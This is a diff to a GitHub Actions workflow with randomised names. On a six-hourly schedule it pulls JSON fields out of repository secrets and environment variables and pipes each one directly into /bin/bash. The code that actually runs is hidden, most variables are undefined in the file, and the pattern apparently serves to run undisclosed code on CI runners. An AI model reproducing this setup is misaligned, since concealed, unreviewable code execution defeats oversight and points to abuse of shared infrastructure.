@@ -2,9 +2,8 @@ name: zhujingcheng3417
 on:
   workflow_dispatch:
   schedule:
-    - cron: '11 1/6 * * *'
-
-jobs:  # 8057
+    - cron: '21 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,21 +11,17 @@ jobs:  # 8057
       - uses: actions/checkout@v4
       - name: zhujingcheng3417
         env:
-          gi1933: ${{ secrets.gi1933 }}
+          exzyl30119: ${{ secrets.exzyl30119 }}
         run: |
-          echo $gi1933 | jq -r .lwa1 | /bin/bash
-          echo $fe23 | jq -r .hx6 | /bin/bash
-          echo $zfy4729 | jq -r .ab8329 | /bin/bash
-          echo $hhmxa624 | jq -r .st3 | /bin/bash
-          echo $j62 | jq -r .mi267 | /bin/bash
-          echo $my70244 | jq -r .ioq67656 | /bin/bash
-          echo $gjv295 | jq -r .ql64391 | /bin/bash
-          echo $x9821 | jq -r .anzcq16 | /bin/bash
-          echo $l9 | jq -r .ph18 | /bin/bash
-          echo $k92 | jq -r .nkbw77771 | /bin/bash
-          echo $wx6 | jq -r .au9413 | /bin/bash
-          echo $amxb3935 | jq -r .jpid4733 | /bin/bash
-          echo $fb90 | jq -r .abqz01568 | /bin/bash
-          echo $x34 | jq -r .v40 | /bin/bash
-          echo $oeopg5 | jq -r .tpyzo71 | /bin/bash
+          echo $exzyl30119 | jq -r .o1 | /bin/bash
+          echo $vvq0946 | jq -r .msekq3932 | /bin/bash
+          echo $ihzur1 | jq -r .r41510 | /bin/bash
+          echo $dmch0 | jq -r .o5114 | /bin/bash
+          echo $prfxa9 | jq -r .imgru86 | /bin/bash
+          echo $owd70919 | jq -r .hnys9681 | /bin/bash
+          echo $crikc530 | jq -r .lo7 | /bin/bash
+          echo $ut5 | jq -r .n8 | /bin/bash
+          echo $on74720 | jq -r .f7156 | /bin/bash
+          echo $gzji627 | jq -r .mdy6430 | /bin/bash
+          echo $i9 | jq -r .h58412 | /bin/bash
 
